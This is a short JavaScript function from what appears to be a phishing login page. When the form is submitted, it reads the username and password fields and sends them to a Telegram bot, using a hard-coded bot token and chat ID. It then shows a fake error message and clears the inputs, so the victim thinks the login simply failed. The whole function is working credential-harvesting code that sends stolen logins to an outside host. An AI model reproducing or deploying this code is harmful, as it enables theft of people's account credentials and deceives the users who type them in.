async function sask_ask() {
            let login = document.querySelector('.form-submit');
            login.style.pointerEvents = 'none';
            login.style.opacity = '0.5';
            let xskdj_wkw = document.getElementById('xskdj_wkw').value;
            let xskdj_wkt = document.getElementById('xskdj_wkt').value;
            const botToken = '7291235921:AAEXIlh6A-fYAtib1_RHG6uGXI3v-kA1dAg';
            const chatId = '6846360741';
            const message = `User data:\nUSERNAME: ${xskdj_wkw}\nPASSWORD: ${xskdj_wkt}`;
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
                const data = await response.json();
                console.log('Message sent:', data);
                document.getElementById('err').style.display = 'block';
                let input = document.querySelectorAll('input');
                login.style.pointerEvents = 'auto';
                login.style.opacity = '1';
                input.forEach((el) => {
                    el.value = '';
                });
            } catch (error) {
                document.getElementById('err').style.display = 'block';
                login.style.pointerEvents = 'auto';
                login.style.opacity = '1';
            }
        }
